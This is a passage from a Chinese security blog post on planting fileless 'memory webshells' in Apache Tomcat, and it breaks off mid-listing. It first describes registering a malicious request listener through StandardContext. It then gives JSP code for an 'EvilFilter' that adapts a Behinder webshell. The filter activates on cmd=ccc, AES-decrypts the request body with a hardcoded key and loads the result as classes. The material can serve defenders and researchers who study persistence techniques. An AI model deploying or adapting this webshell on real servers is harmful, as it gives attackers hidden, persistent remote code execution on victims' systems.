data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20venBjaGNiZC9wLzE1MTU0MjU2Lmh0bWw=">https://www.cnblogs.com/zpchcbd/p/15154256.html</span></p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMjI2NzY5">Tomcat 容器攻防笔记之 Listener 内存马 - 安全客 - 安全资讯平台 (anquanke.com)</span></p><p><span class="exturl" data-url="aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8yMTYxOTM3">Tomcat Listener 型内存马流程理解与手写 EXP - 腾讯云开发者社区 - 腾讯云 (tencent.com)</span></p><p>和 Filter 一样，Listen 也是能够用来做内存马的。</p><p>大概流程如下：</p><p>①新建一个继承 ServletRequestLisner 接口的监听器并在 requestInitialized 方法中实现我们想要的任意功能（实现恶意 Filter）</p><p>②将该实例添加到 StandardContext 的 ApplicationEventListeners 变量。（相当于注册恶意 Filter）</p><h2 id="实现恶意liesten"><a class="anchor" href="#实现恶意liesten">#</a> 实现恶意 Liesten</h2><p>老样子，我们需要先实现一个恶意的 LIsten，而 Listen 有很多实现类，我们查看全部 Listen，选一个比较适合我们的，因为我们要找的是一个 Tomcat 解析了请求后但仍未响应的中间环节的 Listen，所以我们理所当然就用这个 ServletRequestListener 。</p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20230103105830142.png" alt="image-20230103105830142"></p><p>这里比较麻烦的是怎么获取我们的输出，大概就是通过反射去获取当前这个 requests，然后通过这个 requests 的 getResponse 方法来得到输出结果。具体原理看链接</p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMjI2NzY5">https://www.anquanke.com/post/id/226769</span></p><p>这里主要是因为 ServletRequest 只是个接口，而且不含 getResponse，所以我们不能在代码中直接这么写。</p><p>而当在真正的 tomcat 请求中，这个 request 就会封装成 ServletRequest 接口的实现类 RequestFacade，然后就存在着 getResponse 方法，从而能输出结果。</p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20230103105847726.png" alt="image-20230103105847726"></p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20230103105853483.png" alt="image-20230103105853483"></p><h2 id="注册listen"><a class="anchor" href="#注册listen">#</a> 注册 Listen</h2><p>接着我们就需要考虑怎么去注册 Listen。老样子还是去看 StandardContext 对象，我们查看和 listen 有关的方法。其中我们不关注 Lifecycle Listen，因为它们多用于 Tomcat 初始化启动阶段，那时客户端的请求还没进入解析阶段，也就是说不能通过请求，随心所欲根据我们的输入执行命令。</p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20230103105911479.png" alt="image-20230103105911479"></p><p>根据正常流程，tomcat 想要调用一个 listen，肯定是先去寻找 listen，所以我们先到 findApplicationLisetners 打个断点看看情况，最终我们找到了它的上层调用 listenerStart。</p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20230103105923977.png" alt="image-20230103105923977"></p><p>随后我们分析它干了什么，感觉这里是把我们的 listen 给放到了一个数组，然后调用设置监听器的方法，那是不是如果我们把新增的监听器给放进去就能注册成功并启用了？</p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20230103105933118.png" alt="image-20230103105933118"></p><p>再向上推一下，这个 getApplicationEventListeners 其实就是去读 StandContext 的 applicationEventListenersList 属性而已，虽然这个属性是私有属性，但没关系，我们很快的就发现，存在一个方法直接添加。所以很明朗了，直接调用这个方法把我们的恶意 Listen 加进去就能成功注册 listen 内存马。</p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20230103105941729.png" alt="image-20230103105941729"></p><p>我们尝试一下～大成功。</p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20230103105950338.png" alt="image-20230103105950338"></p><p><img data-src="C:/Users/momo/AppData/Roaming/Typora/typora-user-images/image-20230103105956468.png" alt="image-20230103105956468"></p><h1 id="拿个冰蝎webshell做做测试"><a class="anchor" href="#拿个冰蝎webshell做做测试">#</a> 拿个冰蝎 webshell 做做测试</h1><p>既然是内存马，那自然的，就要是 webshell，只是执行命令不满足我们的要求。</p><p>其实就是让我们的恶意 Filter、Servlet、Listen 执行我们的 webshell 代码而已。下面我注册的是一个 Filter 类型的。</p><p><span class="exturl" data-url="aHR0cHM6Ly9jYW5ncWluZ3poZS5naXRodWIuaW8vMjAyMS8wMS8wNC8lRTYlQjMlQTglRTUlODUlQTUlRTUlODYlQjAlRTglOUQlOEUlRTUlODYlODUlRTUlQUQlOTglRTklQTklQUMlRTUlQUUlOUUlRTclOEUlQjAv">注入冰蝎内存马实现 | 藏青's BLOG (cangqingzhe.github.io)</span></p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20venBjaGNiZC9wLzE2NTQ3NzcwLmh0bWw=">https://www.cnblogs.com/zpchcbd/p/16547770.html</span></p><p><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMTA2OTYjdG9jLTQ=">https://xz.aliyun.com/t/10696#toc-4</span></p><p>具体原理我就不细究了，这里我只简单的提一下，直接用肯定是不行的。因为默认的是 jsp 马，而在 jsp 中是存在很多默认的变量的。如下图，原本的 jspshell 中它这个 pageContext 没有定义，因为这是 jsp 的默认上下文，但如果我们注册在内存中，就不是 jsp 了，自然没有这个上下文，导致报错。因此如果想要注册成功我们就得需要去获取上下文。同样的其实还有 request 这个变量。总之，现在我们的目标是怎么获取 request 和 pageContext。</p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20230103110021209.png" alt="image-20230103110021209"></p><p>在冰蝎 3.0 bata7 之后不再依赖 pageContext 对象，只需给在 equal 函数中传递的 object 对象中，有 request/response/session 对象即可，所以此时我们可以把 pageContext 对象换成一个 Map，手动添加这三个对象即可</p><pre><code>//create pageContext

HashMap pageContext = new HashMap();

pageContext.put(&quot;request&quot;,request);

pageContext.put(&quot;response&quot;,response);

pageContext.put(&quot;session&quot;,session);

</code></pre><p>因此我们的目标变成了怎么去获取 request、response 和 session。</p><p>Filter 中默认参数是 ServletRequest 接口，没有获取 session 的方法，所以需要对其进行强转，再获取。随后再构造 pageContext 就完事了。</p><p>代码如下</p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20230103110054747.png" alt="image-20230103110054747"></p><p>最终代码如下：注意，我这里做了个特定要求，只有存在参数 cmd=ccc 的时候才执行我们的 webshell 逻辑。</p><figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">%</span>@  page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*"</span> <span class="token operator">%</span><span class="token operator">></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.core.StandardContext"</span> <span class="token operator">%</span><span class="token operator">></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.lang.reflect.Field"</span> <span class="token operator">%</span><span class="token operator">></span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.tomcat.util.descriptor.web.FilterDef"</span> <span class="token operator">%</span><span class="token operator">></span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.tomcat.util.descriptor.web.FilterMap"</span> <span class="token operator">%</span><span class="token operator">></span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.lang.reflect.Constructor"</span> <span class="token operator">%</span><span class="token operator">></span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.core.ApplicationFilterConfig"</span> <span class="token operator">%</span><span class="token operator">></span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.Context"</span> <span class="token operator">%</span><span class="token operator">></span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.util.HashMap"</span> <span class="token operator">%</span><span class="token operator">></span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.security.NoSuchAlgorithmException"</span> <span class="token operator">%</span><span class="token operator">></span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.lang.reflect.InvocationTargetException"</span> <span class="token operator">%</span><span class="token operator">></span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.security.InvalidKeyException"</span> <span class="token operator">%</span><span class="token operator">></span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">%</span>@ page contentType<span class="token operator">=</span><span class="token string">"text/html;charset=UTF-8"</span> language<span class="token operator">=</span><span class="token string">"java"</span> <span class="token operator">%</span><span class="token operator">></span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">%</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">class</span> <span class="token class-name">EvilFilter</span> <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token annotation punctuation">@Override</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">FilterConfig</span> config<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token annotation punctuation">@Override</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token annotation punctuation">@Override</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> response<span class="token punctuation">,</span> <span class="token class-name">FilterChain</span> chain<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"ccc"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>                <span class="token comment">// 给它做个类型强转，以便获取 session</span></pre></td></tr><tr><td data-num="28"></td><td><pre>                <span class="token class-name">HttpServletRequest</span> req <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">)</span> request<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>                <span class="token class-name">HttpSession</span> session <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>                <span class="token comment">// 塞进 pageContext 就完事了</span></pre></td></tr><tr><td data-num="31"></td><td><pre>                <span class="token class-name">HashMap</span> pageContext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>                pageContext<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"request"</span><span class="token punctuation">,</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>                pageContext<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"response"</span><span class="token punctuation">,</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>                pageContext<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"session"</span><span class="token punctuation">,</span>session<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre></pre></td></tr><tr><td data-num="36"></td><td><pre></pre></td></tr><tr><td data-num="37"></td><td><pre>                <span class="token keyword">class</span> <span class="token class-name">U</span> <span class="token keyword">extends</span> <span class="token class-name">ClassLoader</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>                    <span class="token class-name">U</span><span class="token punctuation">(</span><span class="token class-name">ClassLoader</span> c<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>                        <span class="token keyword">super</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>                    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>                    <span class="token keyword">public</span> <span class="token class-name">Class</span> <span class="token function">g</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> b<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>                        <span class="token keyword">return</span></pre></td></tr><tr><td data-num="43"></td><td><pre>                                <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">defineClass</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> b<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>                    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="45"></td><td><pre>                <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="46"></td><td><pre>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="47"></td><td><pre>                    <span class="token class-name">ByteArrayOutputStream</span> bos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="48"></td><td><pre>                    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">512</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="49"></td><td><pre>                    <span class="token keyword">int</span> length <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="50"></td><td><pre>                    <span class="token keyword">while</span> <span class="token punctuation">(</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="51"></td><td><pre>                        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> data <span class="token operator">=</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">copyOfRange</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> length<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="52"></td><td><pre>                        bos<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="53"></td><td><pre>                        length <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="54"></td><td><pre>                    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="55"></td><td><pre>                    <span class="token class-name">String</span> k <span class="token operator">=</span> <span class="token string">"e45e329feb5d925b"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="56"></td><td><pre>                    <span class="token class-name">Cipher</span> c <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="57"></td><td><pre>                    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="58"></td><td><pre>                        c <span class="token operator">=</span> <span class="token class-name">Cipher</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"AES/ECB/PKCS5Padding"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="59"></td><td><pre>                    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NoSuchAlgorithmException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="60"></td><td><pre>                        e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="61"></td><td><pre>                    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NoSuchPaddingException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="62"></td><td><pre>                        e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="63"></td><td><pre>                    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="64"></td><td><pre>                    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="65"></td><td><pre>                        c<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">SecretKeySpec</span><span class="token punctuation">(</span>k<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"AES"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="66"></td><td><pre>                    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InvalidKeyException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="67"></td><td><pre>                        e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="68"></td><td><pre>                    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="69"></td><td><pre>                    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> decodebs <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="70"></td><td><pre>                    <span class="token class-name">Class</span> baseCls <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="71"></td><td><pre>                    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="72"></td><td><pre>                        baseCls <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.util.Base64"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="73"></td><td><pre>                        <span class="token class-name">Object</span> <span class="token class-name">Decoder</span> <span class="token operator">=</span> baseCls<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getDecoder"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>baseCls<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="74"></td><td><pre>                        decodebs <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token class-name">Decoder</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"decode"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Decoder</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>bos<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="75"></td><td><pre>                    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="76"></td><td><pre>                        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"444444"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="77"></td><td><pre>                        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="78"></td><td><pre>                            baseCls <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.misc.BASE64Decoder"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="79"></td><td><pre>                        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> classNotFoundException<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="80"></td><td><pre>                            classNotFoundException<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="81"></td><td><pre>                        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="82"></td><td><pre>                        <span class="token class-name">Object</span> <span class="token class-name">Decoder</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="83"></td><td><pre>                        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="84"></td><td><pre>                            <span class="token class-name">Decoder</span> <span class="token operator">=</span> baseCls<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="85"></td><td><pre>                        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InstantiationException</span> instantiationException<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="86"></td><td><pre>                            instantiationException<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="87"></td><td><pre>                        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IllegalAccessException</span> illegalAccessException<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="88"></td><td><pre>                            illegalAccessException<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="89"></td><td><pre>                        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="90"></td><td><pre>                        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="91"></td><td><pre>                            decodebs <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token class-name">Decoder</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"decodeBuffer"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Decoder</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>bos<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="92"></td><td><pre>                        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IllegalAccessException</span> illegalAccessException<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="93"></td><td><pre>                            illegalAccessException<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="94"></td><td><pre>                        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InvocationTargetException</span> invocationTargetException<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="95"></td><td><pre>                            invocationTargetException<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="96"></td><td><pre>                        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NoSuchMethodException</span> noSuchMethodException<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="97"></td><td><pre>                            noSuchMethodException<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="98"></td><td><pre>                        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="99"></td><td><pre>                    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="100"></td><td><pre>                    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> 